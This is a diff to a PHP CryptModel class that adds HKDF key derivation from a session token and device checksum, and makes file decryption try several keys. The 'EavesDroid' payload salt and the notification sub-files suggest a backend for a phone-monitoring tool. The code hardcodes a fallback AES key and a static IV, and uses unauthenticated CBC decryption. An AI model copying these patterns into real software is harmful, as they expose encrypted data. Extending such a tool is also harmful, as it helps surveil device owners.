@@ -99,12 +99,29 @@ class CryptModel extends Model
     }
 
     /**
-     * Decrypts file content with AES-128-CBC.
+     * Derives a dynamic AES encryption key via HKDF (RFC 5869) from session token and device checksum.
+     *
+     * @param string $authToken
+     * @param string $deviceChecksum
+     * @param int $length
+     * @param string $info
+     * @param string $salt
+     * @return string
+     */
+    public function deriveDeviceKey(string $authToken, string $deviceChecksum, int $length = 16, string $info = 'payload_aes_encryption', string $salt = 'EavesDroidPayloadV1'): string
+    {
+        $ikm = $authToken . ':' . $deviceChecksum;
+        return hash_hkdf('sha256', $ikm, $length, $info, $salt);
+    }
+
+    /**
+     * Decrypts file content with AES-128-CBC using derived dynamic key or default fallback.
      *
      * @param string $value
+     * @param string|null $overrideKey
      * @return string|false
      */
-    public function decrypt_file(string $value)
+    public function decrypt_file(string $value, ?string $overrideKey = null)
     {
         // Plaintext passthrough: composite dispatchers write unencrypted JSON
         // sub-files (e.g. parse_apps_notifications). If the input is already
@@ -115,40 +132,48 @@ class CryptModel extends Model
 
         try {
             $cipher_algo = "AES-128-CBC";
-            $crypt_key = getenv('FILE_CRYPT_KEY') ?: "a:r2yt>N3_\\Py,f=";
+            $default_key = getenv('FILE_CRYPT_KEY') ?: "a:r2yt>N3_\\Py,f=";
 
-            // 1. Try assuming raw data with dynamic IV (first 16 bytes)
-            if (strlen($value) > 16) {
-                $iv = substr($value, 0, 16);
-                $ciphertext = substr($value, 16);
-                $dec_val = openssl_decrypt($ciphertext, $cipher_algo, $crypt_key, OPENSSL_RAW_DATA, $iv);
-                if ($dec_val !== false) {
-                    return $dec_val;
+            $candidate_keys = [];
+            if (!empty($overrideKey)) {
+                $candidate_keys[] = $overrideKey;
+            }
+            $candidate_keys[] = $default_key;
+
+            foreach ($candidate_keys as $crypt_key) {
+                // 1. Try assuming raw data with dynamic IV (first 16 bytes)
+                if (strlen($value) > 16) {
+                    $iv = substr($value, 0, 16);
+                    $ciphertext = substr($value, 16);
+                    $dec_val = openssl_decrypt($ciphertext, $cipher_algo, $crypt_key, OPENSSL_RAW_DATA, $iv);
+                    if ($dec_val !== false && $dec_val !== '') {
+                        return $dec_val;
+                    }
                 }
-            }
 
-            // 2. Try assuming base64-encoded data with dynamic IV (first 16 bytes of decoded output)
-            $base64_decoded_input = base64_decode($value, true);
-            if ($base64_decoded_input !== false && strlen($base64_decoded_input) > 16) {
-                $iv = substr($base64_decoded_input, 0, 16);
-                $ciphertext = substr($base64_decoded_input, 16);
-                $dec_val2 = openssl_decrypt($ciphertext, $cipher_algo, $crypt_key, OPENSSL_RAW_DATA, $iv);
-                if ($dec_val2 !== false) {
-                    return $dec_val2;
+                // 2. Try assuming base64-encoded data with dynamic IV (first 16 bytes of decoded output)
+                $base64_decoded_input = base64_decode($value, true);
+                if ($base64_decoded_input !== false && strlen($base64_decoded_input) > 16) {
+                    $iv = substr($base64_decoded_input, 0, 16);
+                    $ciphertext = substr($base64_decoded_input, 16);
+                    $dec_val2 = openssl_decrypt($ciphertext, $cipher_algo, $crypt_key, OPENSSL_RAW_DATA, $iv);
+                    if ($dec_val2 !== false && $dec_val2 !== '') {
+                        return $dec_val2;
+                    }
                 }
-            }
 
-            // 3. Fallback: Try static IV (legacy mode)
-            $legacy_iv = getenv('FILE_CRYPT_IV') ?: '[M[@_w[F4a>yQsJW';
-            $dec_legacy = openssl_decrypt($value, $cipher_algo, $crypt_key, OPENSSL_RAW_DATA, $legacy_iv);
-            if ($dec_legacy !== false) {
-                return $dec_legacy;
-            }
+                // 3. Fallback: Try static IV (legacy mode)
+                $legacy_iv = getenv('FILE_CRYPT_IV') ?: '[M[@_w[F4a>yQsJW';
+                $dec_legacy = openssl_decrypt($value, $cipher_algo, $crypt_key, OPENSSL_RAW_DATA, $legacy_iv);
+                if ($dec_legacy !== false && $dec_legacy !== '') {
+                    return $dec_legacy;
+                }
 
-            if ($base64_decoded_input !== false) {
-                $dec_legacy2 = openssl_decrypt($base64_decoded_input, $cipher_algo, $crypt_key, OPENSSL_RAW_DATA, $legacy_iv);
-                if ($dec_legacy2 !== false) {
-                    return $dec_legacy2;
+                if ($base64_decoded_input !== false) {
+                    $dec_legacy2 = openssl_decrypt($base64_decoded_input, $cipher_algo, $crypt_key, OPENSSL_RAW_DATA, $legacy_iv);
+                    if ($dec_legacy2 !== false && $dec_legacy2 !== '') {
+                        return $dec_legacy2;
+                    }
                 }
             }
 
